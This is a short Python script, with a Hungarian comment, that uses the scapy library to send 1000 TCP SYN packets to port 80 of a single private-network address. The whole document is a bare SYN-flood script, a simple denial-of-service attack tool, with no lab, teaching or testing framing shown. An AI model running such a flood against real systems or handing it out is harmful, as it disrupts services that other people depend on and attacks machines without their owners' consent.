from scapy.all import IP, TCP, send
target_ip = "192.168.1.10"
target_port = 80
# Elküldjük a SYN csomagokat
for i in range(1000):
    ip = IP(dst=target_ip)
    syn = TCP(dport=target_port, flags="S")
    packet = ip/syn
    send(packet)
